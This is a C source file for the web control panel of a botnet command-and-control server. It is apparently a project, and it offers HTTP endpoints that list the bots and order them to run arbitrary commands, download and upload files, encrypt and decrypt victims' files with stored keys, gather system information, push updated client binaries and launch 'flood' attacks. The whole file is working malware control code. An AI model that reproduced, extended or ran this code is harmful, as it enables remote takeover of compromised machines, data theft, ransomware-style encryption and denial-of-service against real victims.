#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include "../lib/cJSON.h"
#include "../lib/mongoose.h"
#include "../include/server/hash_table.h"
#include "../include/commands.h"
#include "../include/logging.h"
#include "../include/server/web_server.h"
#include "../include/server/server_constants.h"
#include "../include/send_message.h"
#include "../include/receive_message.h"
#include "../include/file_exchange.h"

// Access global table for web implementation :)
extern ClientHashTable hash_table;

static const char *static_dir = "../static"; // Website files
volatile bool stop_server = false; // Define the stop_server flag

// Function to serve static files
static void serve_static_file(struct mg_connection *c, struct mg_http_message *hm) {
    char path[512];
    const char *uri = hm->uri.buf;
    size_t uri_len = hm->uri.len;

    // Uri has static (8 first bytes), to be removed to get actual uri
    if (strncmp(uri, "/static/", 8) == 0) {
        uri += 8; // Skip the "/static/" prefix
        uri_len -= 8;
    }

    // get filepath
    snprintf(path, sizeof(path), "%s/%.*s", static_dir, (int)uri_len, uri);
    output_log("Attempting to serve file: %s\n", LOG_DEBUG, LOG_TO_ALL, path);

    // The file requested does not exist
    struct stat st;
    if (stat(path, &st) != 0 || S_ISDIR(st.st_mode)) {
        output_log("File not found: %s\n", LOG_ERROR, LOG_TO_ALL, path);
        mg_http_reply(c, 404, "", "File not found\n");
        return;
    }

    // return file
    struct mg_http_serve_opts opts = {.root_dir = static_dir};
    mg_http_serve_file(c, hm, path, &opts);
}

// Function to list all bots
void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
    char response[4096] = "[";
    bool first = true;

    for (size_t i = 0; i < hash_table.size; i++) {
        Client *client = hash_table.table[i];
        while (client != NULL) {
            if (!first) strcat(response, ",");
            char client_info[256];
            snprintf(client_info, sizeof(client_info),
                     "{\"id\":\"%s\",\"socket\":\"%d\",\"status\":\"%s\"}",
                     client->id,
                     client->socket,
                     client->state == LISTENING ? "listening" :
                     client->state == ACTIVE ? "active" : "unreachable");
            strcat(response, client_info);
            first = false;
            client = client->next;
        }
    }

    strcat(response, "]");
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
}

void handle_download_request(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};
    char file_name[256] = {0};

    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
    mg_http_get_var(&hm->body, "file_name", file_name, sizeof(file_name));

    // Validate required fields
    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    if (strlen(file_name) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File name is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Build the Command struct
    Command cmd = {
        .cmd_id = "DOWNLOAD",
        .order_type = DOWNLOAD,
        .delay = 0,
        .program = strdup("DOWNLOAD"),
        .expected_exit_code = 0,
        .params = malloc(2 * sizeof(char *)) // Allocate space for params
    };

    cmd.params[0] = strdup(file_name); // Add the file name as the first parameter
    cmd.params[1] = NULL; // Null-terminate the params array

    // Send the command to the client
    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send download command to client\"}");
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
    free_command(&cmd); // Free dynamically allocated fields
}

void handle_upload_request(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};
    char file_name[512] = {0};

    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
    mg_http_get_var(&hm->body, "file_name", file_name, sizeof(file_name));

    // Validate required fields
    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    if (strlen(file_name) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File name is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    

    // Send the command to the client
    if (!send_file(client->socket, file_name)) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to upload file to client\"}");
        return;
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
}
void handle_encrypt_request(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};
    char file_path[256] = {0};

    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
    mg_http_get_var(&hm->body, "file_path", file_path, sizeof(file_path));

    // Validate required fields
    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    if (strlen(file_path) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File path is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Build the Command struct
    Command cmd = {
        .cmd_id = "ENCRYPT",
        .order_type = ENCRYPT,
        .delay = 0,
        .program = strdup("ENCRYPT"),
        .expected_exit_code = 0,
        .params = malloc(2 * sizeof(char *)) // Allocate space for params
    };

    cmd.params[0] = strdup(file_path); // Add the file name as the first parameter
    cmd.params[1] = NULL; // Null-terminate the params array

    // Send the command to the client
    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send encrypt command to client\"}");
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
    free_command(&cmd); // Free dynamically allocated fields
}

void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};
    char file_path[256] = {0};
    char key[256] = {0};

    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
    mg_http_get_var(&hm->body, "file_path", file_path, sizeof(file_path));

    // Validate required fields
    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    if (strlen(file_path) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File path is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }
    char file_path_to_key[512];
    snprintf(file_path_to_key, sizeof(file_path_to_key),
             "/tmp/botnet/download/%s/31d6cfe0d16ae931b73c59d7e0c089c0.log",
             client->id);

    FILE *fp = fopen(file_path_to_key, "r");
    if (!fp) {
        output_log("Failed to open key file: %s\n", LOG_ERROR, LOG_TO_ALL, file_path_to_key);
        return;
    }

    if (fgets(key, STRLEN, fp) == NULL) {
        output_log("Failed to read key from file: %s\n", LOG_ERROR, LOG_TO_ALL, file_path_to_key);
        fclose(fp);
        return;
    }

    // Supprime le saut de ligne éventuel
    key[strcspn(key, "\r\n")] = '\0';

    fclose(fp);
    

    // Build the Command struct
    Command cmd = {
        .cmd_id = "DECRYPT",
        .order_type = DECRYPT,
        .delay = 0,
        .program = strdup("DECRYPT"),
        .expected_exit_code = 0,
        .params = malloc(3 * sizeof(char *)) // Allocate space for params
    };

    cmd.params[0] = strdup(file_path); // Add the file path as the first parameter
    cmd.params[1] = strdup(key);
    cmd.params[2] = NULL; // Null-terminate the params array

    // Send the command to the client
    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send decrypt command to client\"}");
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
    free_command(&cmd); // Free dynamically allocated fields
}

// Function to handle sending a command to a client
void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_ids[1024] = {0};
    char num_clients_str[16] = {0};
    char cmd_id[64] = {0};
    char program[256] = {0};
    char params[256] = {0};
    char delay_str[16] = {0};
    char expected_code_str[16] = {0};

    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
    mg_http_get_var(&hm->body, "num_clients", num_clients_str, sizeof(num_clients_str));
    mg_http_get_var(&hm->body, "cmd_id", cmd_id, sizeof(cmd_id));
    mg_http_get_var(&hm->body, "program", program, sizeof(program));
    mg_http_get_var(&hm->body, "params", params, sizeof(params));
    mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
    mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));

    int delay = atoi(delay_str);
    int expected_code = atoi(expected_code_str);
    int num_clients = atoi(num_clients_str);

    // Validate input
    if (strlen(program) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Program is required\"}");
        return;
    }

    size_t targeted_clients = 0;
    cJSON *results_array = cJSON_CreateArray(); // To store results for all targeted clients

    // If bot IDs are provided, target those specific clients
    if (strlen(bot_ids) > 0) {
        output_log("Found bot list, looping over and sending commands!\n", LOG_DEBUG, LOG_TO_CONSOLE);
        char *bot_id = strtok(bot_ids, ",");
        while (bot_id != NULL) {
            Client *client = find_client(&hash_table, bot_id);
            if (client != NULL && client->state == LISTENING) {
                // Execute command and fetch result
                cJSON *result = execute_command_and_fetch_result(client, cmd_id, program, params, delay, expected_code);
                if (result) {
                    cJSON_AddItemToArray(results_array, result);
                    targeted_clients++;
                }
            }
            bot_id = strtok(NULL, ",");
        }
    } else if (num_clients > 0) {
        output_log("Found number of clients, sending command!\n", LOG_DEBUG, LOG_TO_CONSOLE);
        // If no bot IDs are provided, target random active clients
        for (size_t i = 0; i < hash_table.size && targeted_clients < num_clients; i++) {
            Client *client = hash_table.table[i];
            while (client != NULL && targeted_clients < num_clients) {
                if (client->state == LISTENING && client->socket > 0) {
                    // Execute command and fetch result
                    cJSON *result = execute_command_and_fetch_result(client, cmd_id, program, params, delay, expected_code);
                    if (result) {
                        cJSON_AddItemToArray(results_array, result);
                        targeted_clients++;
                    }
                }
                client = client->next;
            }
        }
    }

    // Respond with the results
    cJSON *response_json = cJSON_CreateObject();
    cJSON_AddStringToObject(response_json, "status", "success");
    cJSON_AddNumberToObject(response_json, "targeted_clients", targeted_clients);
    cJSON_AddItemToObject(response_json, "results", results_array);

    char *response_str = cJSON_PrintUnformatted(response_json);
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);

    cJSON_Delete(response_json);
    free(response_str);
}

// Function to handle server status
void handle_server_status(
    struct mg_connection *c,
    struct mg_http_message *hm,
    int (*socket_func)(int, int, int),
    int (*connect_func)(int, const struct sockaddr *, socklen_t),
    void (*reply_func)(struct mg_connection *, int, const char *, const char *, ...)
) {
    const char *botnet_server_ip = DEFAULT_SERVER_ADDR;
    int botnet_server_port = atoi(DEFAULT_SERVER_PORT);
    const char *web_server_ip = DEFAULT_WEB_ADDR;
    int web_server_port = atoi(DEFAULT_WEB_PORT);

    // is botnet server active? (attempt connection)
    bool botnet_server_active = false;
    int botnet_socket = socket_func(AF_INET, SOCK_STREAM, 0);
    if (botnet_socket >= 0) {
        struct sockaddr_in botnet_addr;
        botnet_addr.sin_family = AF_INET;
        botnet_addr.sin_port = htons(botnet_server_port);
        inet_pton(AF_INET, botnet_server_ip, &botnet_addr.sin_addr);

        if (connect_func(botnet_socket, (struct sockaddr *)&botnet_addr, sizeof(botnet_addr)) == 0) {
            botnet_server_active = true;
        }
        close(botnet_socket);
    }

    // Is web server active (attempt connection)?
    bool web_server_active = false;
    struct mg_mgr mgr;
    mg_mgr_init(&mgr);
    char addr[64];
    snprintf(addr, sizeof(addr), "http://%s:%d", web_server_ip, web_server_port); // Construct web addr of web server
    struct mg_connection *web_conn = mg_http_connect(&mgr, addr, NULL, NULL);
    if (web_conn != NULL) {
        web_server_active = true;
    }
    mg_mgr_free(&mgr); // We no longer need manager

    int connected_clients = 0;
    int unreachable_clients = 0;

    for (size_t i = 0; i < hash_table.size; i++) {
        // Which clients are connected, or inactive
        Client *client = hash_table.table[i];
        while (client != NULL) {
            if (client->state == ACTIVE || client->state == LISTENING) {
                connected_clients++;
            } else if (client->state == UNREACHABLE) {
                unreachable_clients++;
            }
            client = client->next;
        }
    }

    // create response
    char response[512];
    snprintf(response, sizeof(response),
             "{"
             "\"botnet_server_active\": %s,"
             "\"botnet_server_ip\": \"%s\","
             "\"botnet_server_port\": %d,"
             "\"web_server_active\": %s,"
             "\"web_server_ip\": \"%s\","
             "\"web_server_port\": %d,"
             "\"connected_clients\": %d,"
             "\"unreachable_clients\": %d"
             "}",
             botnet_server_active ? "true" : "false",
             botnet_server_ip,
             botnet_server_port,
             web_server_active ? "true" : "false",
             web_server_ip,
             web_server_port,
             connected_clients,
             unreachable_clients);


    // Send resp
    reply_func(c, 200, "Content-Type: application/json\r\n", "%s", response);
}

void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256];
    mg_http_get_var(&hm->query, "id", bot_id, sizeof(bot_id)); // bot ID requested
    char lines_param[16], offset_param[16];
    mg_http_get_var(&hm->query, "lines", lines_param, sizeof(lines_param)); // Number of lines to fetch
    mg_http_get_var(&hm->query, "offset", offset_param, sizeof(offset_param)); // Offset (from end)

    if (strlen(bot_id) == 0) { // Missing bot id
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    // Bot exists?
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Get the file path for bot msg file ({client_id}_messages.txt)
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "client_messages/%s_messages.txt", bot_id);

    // File exists there ?
    struct stat st;
    if (stat(filepath, &st) != 0) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"File not found\"}");
        return;
    }

    // Parse the number of lines and offset
    int lines = (strlen(lines_param) > 0) ? atoi(lines_param) : 50; // Default to last 50 lines
    int offset = (strlen(offset_param) > 0) ? atoi(offset_param) : 0;

    // Open the file and read the last n lines given
    FILE *file = fopen(filepath, "r");
    if (file == NULL) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to open file\"}");
        return;
    }

    // Allocate memory for the lines
    char **lines_buffer = calloc(lines + offset, sizeof(char *));
    if (lines_buffer == NULL) {
        fclose(file);
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
        return;
    }

    int total_lines = 0, start_line = 0;
    size_t len = 0;
    char *line = NULL;

    // Read the file
    while (getline(&line, &len, file) != -1) {
        if (total_lines >= lines + offset) {
            if (lines_buffer[start_line] != NULL) {
                free(lines_buffer[start_line]); // Free the oldest line
            }
        }
        lines_buffer[start_line] = strdup(line); // Store the new line
        start_line = (start_line + 1) % (lines + offset);
        total_lines++;
    }
    free(line);
    fclose(file);

    // Construct offset range
    int start = (total_lines > lines + offset) ? total_lines - lines - offset : 0;
    int end = (total_lines > offset) ? total_lines - offset : 0;

    // Construct the JSON response
    cJSON *response_json = cJSON_CreateObject();
    cJSON *lines_array = cJSON_CreateArray();

    for (int i = start; i < end; i++) {
        int index = i % (lines + offset);
        if (lines_buffer[index] != NULL) {
            if (strlen(lines_buffer[index]) > 0) { // Ensure the string is not empty
                cJSON_AddItemToArray(lines_array, cJSON_CreateString(lines_buffer[index]));
            }
            free(lines_buffer[index]); // Free the line after using it
            lines_buffer[index] = NULL; // Avoid dangling pointer
        }
    }

    free(lines_buffer); // Free the lines_buffer array

    cJSON_AddItemToObject(response_json, "lines", lines_array);

    // Convert the JSON object to a string
    char *response_str = cJSON_PrintUnformatted(response_json);

    // Send the JSON response
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);

    // Free resources
    cJSON_Delete(response_json);
    free(response_str);
}

void handle_get_cwd(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};

    // Parse the bot_id from the request
    mg_http_get_var(&hm->query, "bot_id", bot_id, sizeof(bot_id));

    output_log("Getting cwd from bot %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);

    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Build the `pwd` command
    Command cmd = {
        .cmd_id = "0",
        .delay = 0,
        .program = strdup("pwd"), // Dynamically allocate program
        .expected_exit_code = 0,
        .params = NULL // Initialize params to NULL
    };

    // Send the command to the client
    output_log("Command built, client found - sending!\n", LOG_DEBUG, LOG_TO_CONSOLE);

    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    // Receive the response from the client
    char buffer[1024] = {0};
    if (receive_message_client(client->socket, buffer, sizeof(buffer), recv) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to receive response from client\"}");
        output_log("Failed receiving reply from client\n", LOG_DEBUG, LOG_TO_CONSOLE);
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    // Use cJSON to create the JSON response
    cJSON *response_json = cJSON_CreateObject();
    cJSON_AddStringToObject(response_json, "cwd", buffer);

    // Convert the JSON object to a string
    const char *response_str = cJSON_PrintUnformatted(response_json);

    // Send the JSON response
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);

    // Free resources
    cJSON_Delete(response_json);
    free((void *)response_str);
    free_command(&cmd); // Free dynamically allocated fields

    output_log("CWD sent back to the server!\n", LOG_DEBUG, LOG_TO_CONSOLE);
}

// HTTP request handler
void handle_request(struct mg_connection *c, int ev, void *ev_data) {
    struct mg_http_message *hm = (struct mg_http_message *) ev_data;
    if (ev == MG_EV_HTTP_MSG) {
        if (strncmp(hm->uri.buf, "/api/bots", hm->uri.len) == 0) {
            handle_list_bots(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/download", hm->uri.len) == 0) {
            handle_download_request(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/upload", hm->uri.len) == 0) {
            handle_upload_request(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
            output_log("Received send command request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
            handle_send_command(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/flood", hm->uri.len) == 0) {
            output_log("Received flooding request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
            handle_send_command(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/encrypt", hm->uri.len) == 0) {
            output_log("Received encrypt request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
            handle_encrypt_request(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/decrypt", hm->uri.len) == 0) {
            output_log("Received decrypt request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
            handle_decrypt_request(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
            handle_server_status(c, hm, socket, connect, mg_http_reply);
        } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
            handle_get_bot_file(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/cwd", hm->uri.len) == 0) {
            handle_get_cwd(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/update", hm->uri.len) == 0) {
            handle_update_bots(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/sysinfo", hm->uri.len) == 0) {
            handle_sysinfo_bots(c, hm);
        } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
            serve_static_file(c, hm);
        } else {
            mg_http_reply(c, 404, "", "Not Found\n");
        }
    }
}

// Start web interface
void *start_web_interface(void *arg) {
    struct mg_mgr mgr;
    mg_mgr_init(&mgr);

    // Set up the server
    struct mg_connection *c = mg_http_listen(&mgr, DEFAULT_WEB_ADDR ":" DEFAULT_WEB_PORT, handle_request, NULL);
    if (c == NULL) {
        output_log("Cannot start web server on %s:%s\n", LOG_ERROR, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);
        return NULL;
    }

    output_log("Web server started on %s:%s\n", LOG_INFO, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);

    // Main server loop
    while (!stop_server) {
        mg_mgr_poll(&mgr, 100); // Poll for events (100 ms timeout)
    }

    mg_mgr_free(&mgr); // Free resources
    return NULL;
}

cJSON *execute_command_and_fetch_result(Client *client, const char *cmd_id, const char *program, const char *params, int delay, int expected_code) {
    // Build the Command struct
    Command cmd = {
        .cmd_id = "",
        .order_type = COMMAND_,
        .delay = delay,
        .program = strdup(program),
        .expected_exit_code = expected_code,
        .params = malloc(2 * sizeof(char *))
    };

    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
    cmd.params[0] = strdup(params);
    cmd.params[1] = NULL;

    // Send the command to the client
    if (send_command(client->socket, &cmd) < 0) {
        free_command(&cmd);
        return NULL;
    }

    // Open the client's log file
    char log_file_path[512];
    snprintf(log_file_path, sizeof(log_file_path), "client_messages/%s_messages.txt", client->id);

    FILE *log_file = fopen(log_file_path, "r");
    if (!log_file) {
        free_command(&cmd);
        return NULL;
    }

    // Seek to the end of the file
    fseek(log_file, 0, SEEK_END);
    long initial_position = ftell(log_file);

    // Poll for changes to the log file
    char buffer[1024];
    struct timeval start, current;
    gettimeofday(&start, NULL);

    int timeout = 1; // 100-ms timeout
    int changes_detected = 0;

    while (1) {
        gettimeofday(&current, NULL);
        long elapsed_time = (current.tv_usec - start.tv_usec);

        if (elapsed_time > timeout) {
            break; // Timeout reached
        }

        fseek(log_file, initial_position, SEEK_SET);
        while (fgets(buffer, sizeof(buffer), log_file)) {
            changes_detected = 1;
            initial_position = ftell(log_file);
        }

        if (changes_detected) {
            // Reset timeout if changes are detected
            gettimeofday(&start, NULL);
            changes_detected = 0;
        }

        usleep(100000); // Sleep for 100ms before polling again
    }

    // Read the new data from the log file
    fseek(log_file, initial_position, SEEK_SET);
    cJSON *result_json = cJSON_CreateObject();
    cJSON_AddStringToObject(result_json, "client_id", client->id);

    cJSON *output_array = cJSON_CreateArray();
    while (fgets(buffer, sizeof(buffer), log_file)) {
        cJSON_AddItemToArray(output_array, cJSON_CreateString(buffer));
    }
    cJSON_AddItemToObject(result_json, "output", output_array);

    fclose(log_file);
    free_command(&cmd);

    return result_json;
}

void handle_update_bots(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_ids[1024] = {0};

    // Parse bot_ids from POST request (comma-separated)
    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));

    if (strlen(bot_ids) == 0) {
        output_log("Update request with no bots provided.\n", LOG_ERROR, LOG_TO_ALL);
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot IDs are required\"}");
        return;
    }

    // Step 2: Loop over each bot ID and perform update
    size_t updated = 0;
    cJSON *results_array = cJSON_CreateArray();

    char *bot_id = strtok(bot_ids, ",");
    while (bot_id != NULL) {
        // Trim whitespace
        while (*bot_id == ' ' || *bot_id == '\t') bot_id++;

        Client *client = find_client(&hash_table, bot_id);
        cJSON *result = cJSON_CreateObject();
        cJSON_AddStringToObject(result, "bot_id", bot_id);

        if (client && client->state == LISTENING && client->socket > 0) {
            // Upload the new client binary
            if (send_file(client->socket, "client")) {
                // Send the UPDATE command
                Command cmd = {
                    .cmd_id = "UPDATE",
                    .order_type = UPDATE,
                    .delay = 0,
                    .program = strdup("UPDATE"),
                    .expected_exit_code = 0,
                    .params = malloc(2 * sizeof(char *))
                };
                cmd.params[0] = strdup(""); // No params needed for UPDATE
                cmd.params[1] = NULL;

                if (send_command(client->socket, &cmd) == 0) {
                    cJSON_AddStringToObject(result, "status", "success");
                    updated++;
                } else {
                    cJSON_AddStringToObject(result, "status", "failed to send update command");
                }
                free_command(&cmd);
            } else {
                cJSON_AddStringToObject(result, "status", "failed to upload client");
            }
        } else {
            cJSON_AddStringToObject(result, "status", "client not found or not listening");
        }

        cJSON_AddItemToArray(results_array, result);
        bot_id = strtok(NULL, ",");
    }

    // Step 3: Respond with results
    cJSON *response_json = cJSON_CreateObject();
    cJSON_AddStringToObject(response_json, "status", "done");
    cJSON_AddNumberToObject(response_json, "updated", updated);
    cJSON_AddItemToObject(response_json, "results", results_array);

    char *response_str = cJSON_PrintUnformatted(response_json);
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
    output_log("Successfully sent update request to clients.\n", LOG_INFO, LOG_TO_ALL);
    cJSON_Delete(response_json);
    free(response_str);
}

void handle_sysinfo_bots(struct mg_connection *c, struct mg_http_message *hm){
    char bot_ids[1024] = {0};

    // Parse bot_ids from POST request (comma-separated)
    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));

    if (strlen(bot_ids) == 0) {
        output_log("Update request with no bots provided.\n", LOG_ERROR, LOG_TO_ALL);
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot IDs are required\"}");
        return;
    }
    // Step 2: Loop over each bot ID and perform update
    size_t getsysinfo = 0;
    cJSON *results_array = cJSON_CreateArray();

    char *bot_id = strtok(bot_ids, ",");
    while (bot_id != NULL) {
        // Trim whitespace
        while (*bot_id == ' ' || *bot_id == '\t') bot_id++;

        Client *client = find_client(&hash_table, bot_id);
        cJSON *result = cJSON_CreateObject();
        cJSON_AddStringToObject(result, "bot_id", bot_id);

        if (client && client->state == LISTENING && client->socket > 0) {
            // Create and send SYSINFO command
            Command cmd = {
                .cmd_id = "SYSINFO",
                .order_type = SYSINFO,
                .delay = 0,
                .program = strdup("SYSINFO"),
                .expected_exit_code = 0,
                .params = malloc(2* sizeof(char *)) 
            };
            cmd.params[0] = strdup("");
            cmd.params[1] = NULL; // No params needed, NULL terminated

            if (send_command(client->socket, &cmd) == 0) {
                    cJSON_AddStringToObject(result, "status", "success");
                    getsysinfo++;
                } 
                else {
                    cJSON_AddStringToObject(result, "status", "failed to send sysinfo command");
                }
                free_command(&cmd);
        } 
        else {
            cJSON_AddStringToObject(result, "status", "client not found or not listening");
        }
        
        cJSON_AddItemToArray(results_array, result);
        bot_id = strtok(NULL, ",");
    }

    cJSON *response_json = cJSON_CreateObject();
    cJSON_AddStringToObject(response_json, "status", "done");
    cJSON_AddNumberToObject(response_json, "sent", getsysinfo);
    cJSON_AddItemToObject(response_json, "results", results_array);

    char *response_str = cJSON_PrintUnformatted(response_json);
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
    output_log("Successfully sent sysinfo request to clients.\n", LOG_INFO, LOG_TO_ALL);
    cJSON_Delete(response_json);
    free(response_str);

}
